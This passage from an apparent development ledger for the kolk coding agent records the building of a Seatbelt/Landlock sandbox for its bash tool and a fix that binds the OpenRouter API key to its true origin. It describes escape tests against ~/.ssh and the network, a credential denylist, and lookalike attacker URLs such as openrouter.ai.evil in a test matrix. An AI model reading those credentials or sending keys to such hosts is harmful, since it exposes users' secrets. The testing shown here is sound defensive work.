    only when there is no file at all. Recording the mode also protects 1c.2, whose atomic replace
    will *not* keep the inode. Shadow store: observed the same 644 — `git checkout`/`reset --hard`
    recreate a changed file at index mode filtered by umask — so `rewindSnapshot` and `RewindTask`
    read the regular files' modes before the git restore (`modesOf`) and reapply them after
    (`reapplyModes`) for every path that is still a regular file. The current mode is used because
    the shadow store records content, not modes, and the mode is the user's; recorded here as the
    limit of the proof. `-race` clean on the package; lint clean darwin and linux; `make check`.
  - [ ] **V34.1c.2 a rewind refuses link and race escapes** — the copy store learns the project root
    and records each entry's resolved real path; a restore recomputes it and refuses, naming both
    paths, when it differs or leaves the root; the write itself goes through a root-anchored,
    component-wise `O_NOFOLLOW` open in the platform layer (unix), with a resolve-then-write fallback
    on Windows recorded as such. **Red:** a symlink planted at the path, and a parent directory
    swapped for a symlink, both make today's rewind write outside the project.
  - [ ] **V34.1c.3 backups of secrets have a stated policy** — the policy, written down in
    `docs/plan/32-shadow-git-snapshots.md`: backups are kept (undo needs the bytes), 0600 inside a
    0700 directory that is removed with the session; they are never displayed unscrubbed — `/diff`
    passes every rendered line through `redact.Scrub`. **Red:** `/diff` prints a canary secret from a
    backed-up `.env`.

- [x] **V34.1e.0 the sandbox policy, the switch and the refusal** — `shell.Sandbox` on
  `shell.Cmd`: root, temp, credential denylist, network `allow|deny`; the root is
  `tools.Options.Root`, never a second value. `sandbox = on|off` in config, **default `off`**
  (owner, 2026-09-05), no `auto`; `/sandbox [on|off]` in session, bare prints state. **Red:** with
  the mechanism stubbed as `unsupported`, `/sandbox on` is refused with the reason and toggles
  nothing; a bash call with a sandbox policy attached refuses, names the missing capability and
  `/sandbox off` verbatim, and does not run the command; with no policy attached it runs. Non-goals:
  no enforcer, no status line, no `/doctor` row, no network enforcement.
  **Contract note:** opened at the owner's direction on 2026-09-05 while S10.1d2 and S10.1d5 are
  still `[~]`; the one-active rule is knowingly set aside for this leaf, and it rebases before landing.
  **Closed 2026-09-05.** `shell.Sandbox{Root, Temp, Deny, Network}` rides on `shell.Cmd`;
  `tools.Options.Sandbox` and `engine.Options.Sandbox` carry it, and the bash tool passes it through
  unchanged. `Run` refuses a sandboxed command when `mechanism()` cannot name an enforcer — as a
  **Result, not an error**: an error aborts the turn, and "I would not run this, here is why, here is
  the switch" is exactly what the model should read and relay. The probe is `unsupported` on every
  platform this leaf, so every sandboxed command refuses, which is the fail-closed shape the plan asks
  for until V34.1e.1/.2 fill it in behind build tags. `/sandbox [on|off]` (bare prints state; `on` is
  refused at the ask with the reason and toggles nothing), `sandbox = on|off` in config (get/set/unset,
  `auto` refused by name), one `/full-auto` nudge per session, `/sandbox` in the registry and therefore
  in `kolk help`. Thirteen tests, red first — three packages failed to build on exactly the missing
  symbols — then green; `internal/shell` under `-race` because the probe is a package variable.
  Decisions made inside the leaf: **default off, opt-in** (owner, mid-leaf; plan 13 §7.2 amended in
  the same session); `NetworkDeny` **deferred to V34.1e.3** rather than shipped as an exported constant
  nothing reads. One gate tripped: `cmd_sandbox.go` called `os.UserHomeDir` and `arch`'s `osOwner` rule
  said only `internal/paths` may — fixed by asking `paths.UserHomeDir()`, which is the point of the
  rule. Walk-back: nothing removed; README "Known limitations" and the capabilities rows still say no
  sandbox, and stay so until V34.1e.6. Left for V34.1e.1: `overrideMechanism` is unexported, so the
  `tools` test relies on the leaf-0 stub; the darwin leaf needs a cross-package test seam before its
  probe becomes real. Verify: `go test -race ./internal/shell/ && go test ./internal/tools/
  ./internal/cli/ ./internal/engine/ && make check` — 3322 tests, all gates green.
- [x] **V34.1e.1 macOS: Seatbelt** — profile generator (SBPL from the policy), inline
  `sandbox-exec -p` wrapper applied to argv in `command()`, `Setpgid` and group kill unchanged;
  absence of `/usr/bin/sandbox-exec` fails closed at the probe. **Red:** escape tests 1–5, 7, 8 from
  plan 13 §7.2 fail on the unwrapped command and pass on the wrapped one, natively on darwin.
  **Closed 2026-09-05.** `sandbox_darwin.go` + `sandbox_other.go` (`!darwin`, refuses); `Run` now
  calls `prepareSandbox` after the probe and refuses a policy it cannot render (a root that cannot be
  resolved) as a Result, same as a missing mechanism; `command(ctx, c, wrap)` on both unix and
  windows. Red was genuine and *runtime*: all seven escape tests failed on "kolk declined to run the
  command instead of the sandbox refusing it" (exit −1), because the assertion for 1–5 requires the
  command to have RUN and the kernel to have said `Operation not permitted`. Then green, under
  `-race`, plus four generator tests (probe finds seatbelt; probe fails closed on a missing binary and
  names it; profile resolves symlinks, escapes quotes, puts the denylist after the broad allow; an
  unresolvable root is refused). **Three amendments to §7.2, recorded there:** the profile is inline
  (`-p`) — it holds only paths, and a 0600 file would need a lifetime, a cleanup and a race with its
  reader; **writes include the toolchain caches** (`Sandbox.Writable`: user cache dir via a new
  `paths.UserCacheDir()` seam, `GOPATH`, `GOMODCACHE`) because test 8 showed `go test` writes its
  build cache outside the root and "root and temp only" broke the one command people turn a sandbox
  on for; and `Run` sets the child's `TMPDIR` to the policy's temp, or every tool that honours it
  scatters scratch outside the sandbox. Broad `mach-lookup`, `sysctl-read`, `ipc-posix*` allows are
  what a shell needs to start; tightening is V34.1e.5's measurement, not this leaf's guess. No
  cross-package test seam was needed after all: the `tools` refusal test now uses a root that does
  not exist, which no enforcer can resolve, so it refuses on every platform for a real reason. The
  cli refusal test skips on darwin and a darwin success test asserts `sandbox → on (seatbelt)` with
  the policy root equal to the jail root; once V34.1e.2 makes linux real, that refusal test needs a
  seam or becomes windows-only — noted for .2. Walk-back: nothing removed. README "Known
  limitations" and the capabilities rows still say no sandbox — on macOS that is now an
  **under-claim**, deliberately, until V34.1e.6 flips every public statement in one commit with its
  pins. Verify: `go test -race -count=1 ./internal/shell/ -run 'Escape|Probe|Seatbelt'` and
  `make check` — 3334 tests, 8.57 MB, all gates.
- [x] **V34.1e.2 Linux: Landlock filesystem** — subdivided 2026-09-05 before any code, because one
  leaf cannot be red→green on this machine: there is no Linux kernel here (no colima/lima instance;
  docker's daemon is down), and `x/sys` v0.47 turned out to ship Landlock's constants and attr
  structs but **not** the syscall wrappers, so this is raw `unix.Syscall` on `SYS_LANDLOCK_*`.
  - [x] **V34.1e.2a the re-exec entry and the probe** — cross-compiled and vetted for linux, no
    kernel needed. `sandboxWrap` becomes `{Argv, Env}` so an enforcer can add environment as well as
    rewrite argv; linux's wrap is `[self, bash, -c, cmd]` with `KOLK_LANDLOCK_CHILD=1` and the policy
    as JSON in `KOLK_LANDLOCK_POLICY` — paths only, nothing secret. `cli.Main` checks that env before
    building an app, so the closed four-command surface is untouched and `kolk help` shows nothing
    new. The child strips both variables before `execve`, or a `kolk` run *inside* the sandbox would
    believe it is the child. `probeMechanism` calls `landlock_create_ruleset(NULL,0,VERSION)` and
    reports `landlock vN`; `ENOSYS`/`EOPNOTSUPP` refuse with a sentence naming the kernel floor.
    **Red (observable here):** policy JSON round-trips; env stripping removes exactly the two names;
    argv shape; on a non-linux host the env-gated entry refuses with a message naming linux and exit
    125, and with the variable unset `Main` dispatches as before. Non-goals: no ruleset, no rules.
    **Closed 2026-09-05.** `landlock.go` (codec, env contract, `MaybeRunAsLandlockChild`),
    `landlock_notlinux.go` (refuses naming the GOOS, 125), `sandbox_linux.go` (raw `unix.Syscall`
    on `SYS_LANDLOCK_CREATE_RULESET` for the ABI probe — `x/sys` v0.47 has sysnums, constants and
    attr structs and **no wrappers**; `prepareSandbox` re-execs `SelfPath()` with the two variables;
    `landlockChildMain` decodes, applies, strips, `execve`s; `applyLandlock` is a deliberate refusal
    until 2b). `sandboxWrap` is `{Argv, Env}` behind a pointer; darwin uses Argv only, `Run` appends
    `Env`. The entry sits at the top of `(*app).main`, env-gated: `kolk help` and the four-command
    pins are untouched. **Red:** shell and cli failed to build on exactly the missing symbols;
    **green** on darwin under `-race`, seatbelt escape tests intact after the refactor;
    cross-compiled and vetted for linux/amd64, linux/arm64, windows. **Two gates tripped and were
    right:** `arch`'s third-party allow-list refused `x/sys` in `internal/shell` until the entry was
    added with its reason (platform layer; the map exists for exactly this), and the reverse rot test
    accepts it because the scanner parses linux-tagged files on any host. **Plan amendment in
    §7.2:** env variables instead of a `landlock-exec` verb. Non-goal held: no rules; the linux child
    refuses rather than running unconfined. **2c resolved without a VM:** CI runs on pull requests, so
    2b's red→green is observed on a PR branch on ubuntu-latest. Verify: `GOOS=linux go vet
    ./internal/shell/ ./internal/cli/`, `go test -race ./internal/shell/ -run Landlock`, `make check`
    — 3340 tests, all gates.
  - [x] **V34.1e.2b the ruleset and the escape tests** — `prctl(PR_SET_NO_NEW_PRIVS)`, create
    ruleset with the fs access set for the probed ABI, add rules: **allow-only** reads per top-level
    entry of `/` except the home, then per entry of the home except the denylist (an enumeration
    with a test asserting every denylist path is unreadable); execute everywhere readable; writes
    for root, temp and `Writable`; `restrict_self`; then `execve` bash. Linux-tagged escape tests
    1–5, 7, 8. **Red must be observed on a Linux kernel**, not assumed.
  - [x] **V34.1e.2c verification on a real kernel** — ubuntu-latest CI runs `make test` on push and
    is authorised; a local VM (`colima start`: an image download and a booted VM) is **the owner's
    call** and the loop stops to ask if CI alone is not enough to observe red→green.
    **2b and 2c closed 2026-09-05, on PR #1, rebase-merged as four commits.** Red was observed on
    ubuntu-latest from a tests-only commit: all seven escape tests and the new ninth failed with "the
    confined child refused before running the command (no ruleset yet)" — exit 125, never a kernel
    refusal, never a compile error. The ruleset then went green on the second attempt; the first
    taught two things the darwin tests could not. **(1) Writes must honour the denylist the same way
    reads do.** Test 4 widens the root to the whole home; a single write rule on it granted `~/.ssh`,
    and Landlock has no deny to lay over an allow. `grantReads` became `grantTree` and serves both
    access sets. **(2) A test binary must intercept the re-exec.** The `tools` refusal test used a
    root that does not exist; on darwin the generator refused it in the parent, on linux the parent
    only encoded the policy and forked — and the child was the `tools` test binary, which had no
    `TestMain` and ran the whole suite again, a dozen levels deep. `prepareSandbox` now validates root
    and temp in the parent exactly as Seatbelt does, and `internal/tools` has the same `TestMain`
    `internal/shell` has. Lint taught a third: golangci on darwin never analyses linux-tagged files, and
    `GOOS=linux golangci-lint run` from a Mac does — four findings (errorlint `%w` on errno, ST1005
    capitalised errors, two unchecked `unix.Close`) fixed before CI could repeat them. Both cli
    sandbox tests now key on `shell.Mechanism()` rather than GOOS, which is what they were asking.
    Green run: 33949991895. On main: `make check` 3340+ tests, all gates. Plan §7.2 amended for
    `grantTree`. **Landlock now confines for real on Linux; Seatbelt on macOS.** Public claims still
    unchanged until V34.1e.6.
- [x] **V34.1e.3 network** — `(deny network*)` in the Seatbelt profile; Landlock ABI ≥ 4
  connect/bind rules; ABI < 4 with `network = deny` is refused, never approximated. **Red:** escape
  test 6 on both platforms; the refusal on a simulated ABI 3.
  **Closed 2026-09-05, PR #2, rebase-merged as two commits.** `NetworkDeny` returns, with its
  enforcement. Red first, on both kernels: a TCP connect under `deny` printed `connected` on ubuntu
  and macOS; a simulated Landlock ABI 3 asked for a deny returned no error. Then green: Seatbelt
  renders `(deny network*)` for `deny` and `(allow network*)` otherwise — a shell still starts under
  the deny, verified; Landlock handles `ACCESS_NET_BIND_TCP|CONNECT_TCP` on the ruleset and adds no
  port rule, which denies every TCP connect and bind — its network rules are allow-only like its
  filesystem ones — and only from ABI 4, so `prepareSandbox` **refuses** a deny below that in the
  parent, naming the floor and the two ways out, never approximating. The escape harness connects
  through bash's `/dev/tcp`, because `curl` fails silently under a denied network (exit 7, no text)
  and the assertion needs the kernel's phrase; a real loopback listener is opened first, and a
  control test (6b) proves the same connect succeeds under `allow`, so 6 cannot pass for a broken
  reason. The probe went behind `landlockABIProbe` so a Mac can simulate a kernel it does not have.
  Guard rails failed on the red commit for exactly the reason `NetworkDeny` was deferred in leaf 0 —
  reachable only from tests — and passed on the green, where both enforcers read it. Green run
  33950485303. Not in this leaf: a knob that sets `deny` for the user's own bash tool — §7.1's
  policy governs delegated children and in-process subagents inherit the parent's policy; wiring
  `deny` for a task kind is a design question flagged for the owner, not a line of code slipped in.
- [x] **V34.1e.4 surface** — status line `sandbox: seatbelt|landlock vN|off`, a `/doctor` row with
  mechanism, ABI/profile and network enforcement, and the one-line bounded diagnostic appended to a
  non-zero result whose output contains `Operation not permitted` / `Permission denied`. **Red:** the
  diagnostic is exactly one line and appears only on that pattern.
  **Closed 2026-09-05, on main.** Platform-neutral leaf, so no PR round-trip: the code is string and
  probe logic over what leaves 1–3 built, and `GOOS=linux go vet` plus `GOOS=linux golangci-lint` ran
  from the Mac beside the darwin run. Red observed: the status-line test named a `Sandbox` field the
  `tui.Status` did not have and the package refused to compile; the diagnostic and doctor tests were
  written first the same way. Green, three surfaces. **(1)** `shell.SandboxDiagnostic` appends one
  bounded line to a sandboxed bash result — only when the exit is a real non-zero (not kolk's own
  refusal at -1, not a timeout) *and* the output carries `Operation not permitted` or `Permission
  denied`. The line names what is confined (root, temp, network) and the switch (`/sandbox off`); it
  never claims the sandbox caused the failure, because the phrase is a hint, not proof. Attached in
  `internal/tools` after `[exit error: …]`. **(2)** `/doctor` grew a `sandbox` section from
  `shell.Report()`: the mechanism or why there is none, whether `network = deny` is enforceable here
  (`networkDenySupported` per platform — Seatbelt always, Landlock from ABI 4), and the default-off
  note with both switches. **(3)** The status line carries a `sandbox` row after `effort`: `off`,
  the mechanism name, or `on, unenforced` — a state the plan did not name, reached when a policy is
  set where nothing can enforce it and every command refuses; the row makes that visible where the
  user already looks instead of leaving it to be discovered. Approval is not a row in the status
  groups (it renders as a lead through `permissionLead`), so "beside approval" became "after
  effort". Focused verification with `-race` on shell, tools, tui, cli; `make check` all gates.
  Nothing public changes until V34.1e.6.
- [x] **V34.1e.5 measurement** — per-command overhead of the wrapper on darwin and linux against the
  cold-start soft budget; confirm the cancel ladder still reaches grandchildren through the wrapper
  (`npm test &` shape). A number over budget is a finding to record, not a note to bury.
  **Closed 2026-09-05, on main (green `1a31ae8`, CI run 33966380022).** Two numbers and one
  property. **The numbers:** `TestSandboxWrapperOverheadStaysUnderTheColdStartBudget` times bare
  against sandboxed `true`, p50 of 21 after one warming exec, and holds the difference to the same
  lines cold start is held to — soft 20 ms logged as a `::warning`, hard 30 ms failing. darwin
  (this Mac): 5.5–6.7 ms (bare ~2.2, sandboxed ~8; `sandbox-exec` compiling the profile). linux
  (ubuntu-latest budgets job): **2.1 ms** (bare 1.5, sandboxed 3.6; kolk re-exec plus the ruleset).
  Both under the soft budget; §7.2's expectation of 10–30 ms was pessimistic by 2–5× and is
  walked back to the measured figures. `check-budgets.sh` lifts the line into the budgets log from
  the one verbose run it already makes for the test-count floor, and a missing line there is an
  `::error`, so the measurement cannot quietly stop running on the runner meant to take it.
  **The property:** two ladder twins run the `npm test &` shape under a policy — a 300 ms timeout
  and a context cancel — and require the grandchild dead within 3 s and `Run` back within 5 s. Both
  pass because both enforcers exec the command in place (`sandbox-exec` applies then execs; the
  Landlock child installs its ruleset then `syscall.Exec`s), so the wrapper *is* the group leader
  and Setpgid covers everything the shell starts. Red was observed by mutation: with `Setpgid:
  false` in `command()` both twins fail with "grandchild N survived through the sandbox wrapper";
  reverted, both pass. Non-goals kept: the ladder itself is untouched; delegated children stay
  §7.1's. `-race` clean on the goroutine test; `make check` all gates; CI green on both runners.
- [x] **V34.1e.6 walk-back and the flip** — in one commit: README "Known limitations",
  `site/capabilities.html` 491/495 to Available, the sandbox cells on every `site/compare/*.html`,
  `site/llms.txt`, and the `test-site.sh` pins that guard each; then this ledger, PLAN item 13's
  matrix row, and `docs/build-log.md`. Nothing flips before V34.1e.0–5 are `[x]`.
  **Closed 2026-09-05, one commit, at the owner's word ("go e.6").** Preconditions held: 1e.0–1e.5
  `[x]`, CI green on both runners for each. What flipped, and to what: README "Known limitations" now
  states the sandbox is opt-in and off by default, names both enforcers with the Linux floor (5.13;
  network deny 6.7), what writes are confined to, that credentials stay unreadable inside a widened
  root, and that a deny the kernel cannot enforce is refused. `site/capabilities.html` card →
  `Available now` / "OS-level execution sandbox, opt-in", with the escape-test count and the measured
  overhead; the legend keeps "Designed, not shipped" so the pin at 238 stays meaningful. `codex-cli`
  card → "Codex sandboxes by default; Kolkrabbi on request" (badge `Kolkrabbi has it`; the residual
  gap is the default and the number of modes) and the table cell. `claude-code` card → "Both
  sandbox the bash tool; Claude Code's network rules are finer", and a new table row — Claude
  Code's facts (Seatbelt / bubblewrap on Linux and WSL2, filesystem and network isolation by allowed
  domain) verified today from its official sandboxing page and recorded privately; its default state
  was not extractable and is not claimed. `llms.txt` limitation line rewritten. `test-site.sh`: the
  llms pin follows the new sentence; two `contains` pins for the capabilities row; a new
  `not_contains` helper with three inverse pins so the old "no OS-level sandbox" wording cannot
  survive in any page — 343 checks. PLAN item 13 says shipped; plan 13's platform matrix and §7.2's
  "unshipped until" paragraph say shipped. Not in this leaf: the README's unrelated "Sandbox
  testing" heading (the mock server) keeps its name — a rename is a wording call for the owner.
  **The sandbox is public. Every public sentence about it is one the tests can defend.**

##### V34.1a.0 threat model and red evidence — complete 2026-09-02

Data flow proven from the current tree:

1. `resolveOpenRouterCredential` loads `OPENROUTER_API_KEY` or the stored `openrouter/default`
   credential before endpoint resolution.
2. `newAgent` calls `provider.NewClient(apiKey.Reveal())`, which installs `secret.AuthTransport`, and
   only afterward overwrites `client.BaseURL` with flag → environment → saved config → default.
3. `AuthTransport.RoundTrip` attaches the bearer to every request it receives. Redirect following is
   refused, but the first request to the replaced host already contains the credential.
4. The same client performs catalog (`/models`) and turn (`/chat/completions`) calls, so both startup
   and inference can exfiltrate the key. `NewHostClient` is already keyless and is not the defect.

Executable evidence passed because it asserts the vulnerable behavior:

- `TestStoredCredentialCompletesOfflineDefaultTurn` points saved/environment `base_url` at an
  arbitrary `httptest` origin and requires `Authorization: Bearer <stored OpenRouter key>`.
- `TestModeAgentFlagRunsTheOrchestratedPipeline` uses the same replacement-host construction through
  the orchestrated path.
- Provider tests prove redirects are refused and host Ollama is keyless, but
  `TestKeyNeverAppearsInAnythingPrintable` likewise changes an authenticated client's public
  `BaseURL` to an arbitrary server and expects the credential to arrive.

Commands: focused CLI and provider reproductions passed, as expected under the vulnerable contract;
`git diff --check` passed. No production code, credential, provider turn, commit, push, tag, release,
or remote state changed. V34.1a.1 is next.

##### V34.1a.1 origin-bound transport — complete 2026-09-02

The red boundary reproduced all three transport-level leak forms before implementation:
`AuthTransport` with a nonzero token and no binding called its base transport; mutating an
authenticated `Client.BaseURL` contacted the replacement server; and `OpenRouterVerifier.BaseURL`
sent the credential to its replacement origin. Each new test failed at its intended assertion.

`secret.NewAuthTransport` now normalizes and privately stores one allowed HTTP origin as scheme,
host, and effective port. A nonzero credential with no binding or a mismatched request returns
`ErrCredentialOrigin` before `Base.RoundTrip`; paths do not change origin. `provider.NewClient` and
OpenRouter key verification bind only to the compiled `https://openrouter.ai` origin. A direct
`BaseURL` mutation can therefore change the attempted request URL but cannot move credential trust.
The transport independently refuses a cross-origin redirect even if an `http.Client` is configured
to follow it, while the provider client also retains its no-redirect policy.

Credential rotation is race-safe. The token is private, `Token`/`SetToken` synchronize access, and
`RoundTrip` uses one snapshot for both validation and header attachment. `Client.SetKey` rotates only
an already-bound OpenRouter transport; an unbound compatible/host client returns
`ErrCredentialBinding` and never gains or swaps auth/HTTP transports. Catalog fixtures that do not
test authentication are now explicitly keyless, while tests that do test authentication use a
test-only origin binding rather than pretending an arbitrary server is OpenRouter.

Hardening evidence:

- Focused `internal/secret` and `internal/provider` tests passed, passed ten repetitions, passed
  under `-race`, and passed `go vet`; `internal/arch` passed and `go test ./... -run '^$' -count=1`
  compiled every package. `git diff --check` passed.
- Removing the origin comparison made the untrusted-origin, redirect, `BaseURL`, verifier, and
  `SetKey` tests fail. The file was restored byte-identically. Removing the token write lock made
  both concurrent tests fail under the race detector; restoration returned `transport.go` to SHA-256
  `0d435b8d0ca4aeb6d0096c54fdc87bbe219ec58a6610e5709ea13d2da7f1edcc`.
- Independent reviewer Laplace first found the zero-to-nonzero token TOCTOU bypass, then the nil-auth
  initialization race. Both were fixed with targeted concurrent tests. Its final read-only review
  returned `CLEAN` and independently passed focused repetition/race, package tests, vet, whole-module
  compilation, and diff checking without changing files.

The two A0 CLI exploit fixtures now fail safely at `ErrCredentialOrigin` before their replacement
servers are reached. They intentionally remain expected-success test failures until V34.1a.2 resolves
the endpoint before credentials and constructs custom compatible endpoints keylessly; this leaf does
not claim the full behavioral suite is green. No credential, provider turn, commit, push, tag,
release, scheduler action, or remote state changed. V34.1a.2 is next.

##### V34.1a.2 startup/client construction — complete 2026-09-02

The endpoint is now selected before any OpenRouter credential is required. `newAgent` and `/models`
both call the single `providerClientForEndpoint` builder after resolving `--base-url` →
`OPENROUTER_BASE_URL` → saved `base_url` → canonical default. A non-canonical endpoint returns a
credentialless `provider.NewCompatibleClient` without reading the OpenRouter manifest or adding
OpenRouter attribution; only the canonical origin loads the stored/environment credential and uses
`provider.NewOpenRouterClient`. The ambiguous `provider.NewClient` constructor was removed, and
arbitrary `httptest` fixtures were migrated to the compatible constructor so tests state the trust
boundary they actually exercise.

Red/green evidence:

- `TestCustomEndpointSkipsCorruptOpenRouterCredentialManifest` and
  `TestModelsUsesCustomEndpointWithoutReadingOpenRouterCredential` failed before the endpoint-first
  branch and passed after it; the compatible stream test observed no Authorization, Referer, or
  X-Title header.
- `TestProviderClientConstructionFollowsEndpointPrecedence` proves flag, environment, saved-config,
  and default selection, including the keyed/credentialless client distinction.
- A mutation changing the custom-endpoint guard to `false && ...` made the corrupt-manifest and
  precedence tests fail; restoring it returned `internal/cli/provider_client.go` byte-identically
  (SHA-256 `09803b67f5cdc19fc8ff5d92ebfc6198692c0396d02fe141707f78b38a15abeb`).
- `go test ./... -count=1`, `go test -race ./internal/secret ./internal/provider ./internal/cli ./internal/engine`,
  `go vet` over those packages, `git diff --check`, and full `make check` passed. The full gate
  reported 3,099 tests, all platform matrices, and all budget/site/surface/installer/spec/release/
  workflow/plan checks green.

The requested independent reviewer was started but could not return because the provider usage limit
was reached; no CLEAN claim is made for that unavailable review. A manual second-pass inspection
found only the already-scoped V34.1a.3 adversarial URL matrix (userinfo, lookalikes, ports, query/
fragment, and canonicalization) remaining. V34.1a.4 retains the mandatory independent closeout.
No credential, provider turn, commit, push, tag, release, scheduler action, or remote state changed.
V34.1a.3 is next.

##### V34.1a.3 adversarial and compatibility matrix — complete 2026-09-02

The matrix is data shared by the provider tests: `replacementOrigins` (eighteen shapes) and
`canonicalSpellings` (seven), so the client, the key verifier, and the startup builder are all
judged against the same list and a row added for one is added for all.

Replacement shapes, every one refused with `secret.ErrCredentialOrigin` before the base transport is
called, for both `ListModels` and `StreamChat` on a canonically bound client whose `BaseURL` was
mutated, and for `OpenRouterVerifier.Verify`: lookalike suffix (`openrouter.ai.evil`), lookalike
subdomain, lookalike prefix (`evil-openrouter.ai`), canonical host inside the path, canonical host
inside the query, trailing-dot FQDN (`openrouter.ai.`), HTTP downgrade, HTTP downgrade with explicit
`:443`, explicit `:8443`, `:80` over https, zero-padded `:0443`, userinfo-shaped authority
(`openrouter.ai@evil.invalid`), userinfo on the canonical host, credential-shaped userinfo,
scheme-relative, no scheme, loopback host, and empty. No refusal error contains the credential.

Canonical spellings, every one accepted by `NewOpenRouterClient` and by the verifier, with the
credentialed request observed at scheme `https`, host `openrouter.ai` (case-insensitively — the wire
request keeps the user's spelling; DNS does not care), port empty or `443`, and no userinfo: as
documented, trailing slash, upper-case host, upper-case scheme, explicit `:443`, query on the path,
fragment on the path.

Further rows: a cancelled context against a replacement origin is refused for being a replacement,
not for being cancelled, and against the canonical origin fails on `context.Canceled` without
mentioning the credential; `NewHostClient`, `NewCompatibleClient` (including on a lookalike and on
the canonical URL itself) refuse `SetKey` with `ErrCredentialBinding` and never report `requiresKey`.
At the CLI boundary, `TestProviderClientEndpointMatrixDecidesKeyedOrKeyless` builds seven keyed and
thirteen keyless clients; every keyless row is constructed over a deliberately corrupt credential
manifest, so any read of the manifest would have failed the construction, and a late `SetKey` on the
result is refused. A canonical endpoint with no stored key returns the guided `kolk key` action
rather than a keyless client. `SameOrigin` itself is tabled over seven equivalent and seventeen
distinct forms, including that a userinfo-bearing URL does not match even itself.

Fixture truthfulness: every authenticated test client is built by `newTestAuthenticatedClient`,
which binds the `httptest` origin explicitly through `secret.NewAuthTransport`; no test asks for a
bearer on an origin it did not bind. The remaining `srv.URL` fixtures use `NewCompatibleClient`.

One production change came out of the lookalike row. `StreamChat` decided whether to send
OpenRouter's `usage.include` extension by `strings.Contains(c.BaseURL, "openrouter.ai")`, so a
compatible client at `…/openrouter.ai/api/v1` or `openrouter.ai.evil` was sent OpenRouter's request
shape. It now follows the client's origin (`requiresKey()`). Not a credential leak; a request-shape
divergence keyed on a substring instead of the binding, which is the same class of mistake.

Two assertions were wrong as first written: they expected the request host lower-cased for the
upper-case spelling. The guard was right and the test was corrected; recorded because a matrix that
was edited until green should say where.

Handed to V34.1d, not fixed here: a userinfo-bearing endpoint receives a keyless compatible client,
but Go's `http.Client` sends the URL's own userinfo as Basic auth to the host the user named — the
user's pasted value to the user's chosen host, and exactly the case V34.1d's "reject URL userinfo"
exists for. A query or fragment on the canonical endpoint binds (same origin) but yields the
malformed request path `/api/v1?trace=1/chat/completions`; the credential stays on `openrouter.ai`,
and rejecting such a `base_url` at the point of typing is config validation, not credential work.

Commands: `go test -count=1 ./internal/secret ./internal/provider ./internal/cli` passed;
`go test -race -count=1 ./internal/secret ./internal/provider ./internal/cli ./internal/engine`
passed; `go vet` over the same packages, `gofmt -l internal/`, and `git diff --check` were clean.
No credential, provider turn, commit, push, tag, release, scheduler action, or remote state changed.
V34.1a.4 is next.

##### V34.1a.4 walk-back and independent closeout — complete 2026-09-02

Wording now matches the code at every place a user meets the endpoint: the `--base-url` flag help
and the `base_url` setting description say the endpoint is used without a key unless it is
`openrouter.ai`; `kolk config set-base-url` says so at the moment of choosing a non-OpenRouter URL;
README's Ollama example, `SECURITY.md`'s credential bullet (naming flag, environment, saved config,
redirect, lookalike, downgrade, port, and userinfo as things that cannot receive the key),
`site/capabilities.html`, and `docs/plan/34` were updated. No help or surface snapshot pinned the
old text.

One targeted mutation per guard, each applied with `sed`, run against its focused test, reversed,
and the file compared by SHA-256 to its pre-mutation hash:

| Guard | Mutation | Focused test that failed |
|---|---|---|
| userinfo refusal (`transport.go`) | drop `\|\| u.User != nil` | `TestSameOriginUsesCredentialTransportCanonicalization` |
| origin comparison (`transport.go`) | `RoundTrip` checks only parse error | `TestCredentialOriginMatrixRefusesEveryReplacementBeforeNetwork` |
| constructor guard (`client.go`) | `false && !IsOpenRouterEndpoint` | `TestNewOpenRouterClientRejectsANonOpenRouterEndpoint` |
| endpoint-first (`provider_client.go`) | `false && !IsOpenRouterEndpoint` | `TestProviderClientEndpointMatrixDecidesKeyedOrKeyless` |
| `SetKey` binding (`client.go`) | install a transport instead of refusing | `TestHostAndCompatibleClientsCannotBeGivenTheOpenRouterCredential` |
| request shape (`client.go`) | back to the host substring | `TestOpenRouterRequestShapeFollowsOriginNotHostSubstring` |
| verifier binding (`keyverify.go`) | unbound `AuthTransport` | `TestOpenRouterKeyVerifierRefusesAReplacementOriginBeforeNetwork` |
| ASCII host (`transport.go`) | `false && !isASCII(host)` | `TestSameOriginUsesCredentialTransportCanonicalization` |

All eight failed under mutation and all files were restored byte-identically. Final hashes:
`transport.go` `c68cbbcebde7c2f796cc51b0c0fce314439434f9da1f7d3bbc1304870acd98b7`, `client.go`
`fd7164106dfba67418e000ceb310b94bf09316f9470b6ff034eb9e415d4a24a8`, `keyverify.go`
`d6b11d5d40db3711b37711d17c68ef9099fb8488cdfbe64ab33fed542480089c`, `provider_client.go`
`09803b67f5cdc19fc8ff5d92ebfc6198692c0396d02fe141707f78b38a15abeb` (unchanged since V34.1a.2).

Independent review. A separate reviewer who had not written the binding was asked to break the
invariant with real tests, not to read the fix. It tried thirty-nine URL shapes through the
transport with the dialer intercepted to record the exact `host:port` net/http would connect to,
every constructor and the CLI builder from all three endpoint sources, six redirect hops under a
client configured to follow them, a forward proxy, a 10,000-iteration token-rotation race, the
zero-value transport, and a grep of every `Reveal()`, `Authorization`, and `http.NewRequest` site in
non-test code. First verdict: **NOT CLEAN**. `strings.ToLower` folds U+0130 (`İ`) to the ASCII
letter `i`, so `https://openrouter.aİ/api/v1` compared equal to the canonical origin at the guard,
in `IsOpenRouterEndpoint`, in the verifier, and in `providerClientForEndpoint` — which then loaded
the stored key and built a bound client — while net/http applied IDNA and dialed
`openrouter.xn--ai-sub:443`. Practical severity low (the TLD does not exist and the bearer is only
written after a TLS handshake against that name), but a genuine breach of the lookalike clause. The
reviewer also confirmed by exhaustive scan that U+0130 is the only rune above 0x7F whose `ToLower`
is an ASCII letter present in the canonical host.

Correction: `normalizeCredentialOrigin` refuses any non-ASCII host before lowering (`isASCII`), so
the accepted set is exactly the ASCII case variants of `openrouter.ai`; the reviewer's spellings, a
percent-encoded `%C4%B0`, a fullwidth letter, and a punycode lookalike were added to every matrix.
Re-review verdict: **CLEAN**. Every original reproducer now refuses before network at every layer;
a reverse-direction scan of 7,054 candidates (every ASCII insertion and substitution at every
position, every `%XX` escape at every position, `xn--` variants, port spellings) found 33 that
survive `url.Parse` and pass the guard, all of which dial `openrouter.ai:443`. Attempts present,
`-race` clean on `secret`, `provider`, `cli`. The reviewer's temporary files were deleted and
`git status` showed none remaining.

Recorded from the review as out of scope here: a forward proxy sees only `CONNECT
openrouter.ai:443` and its own `Proxy-Authorization`; a compatible endpoint's own URL userinfo is
sent as Basic auth by net/http and echoed in unscrubbed transport errors at `client.go` `StreamChat`
and `listModels` return paths — the user's value to the user's host, owned by V34.1d.

Gates: `make check` passed — 3,190 tests, `0 issues` from lint, budgets (9.47 MB, cold start
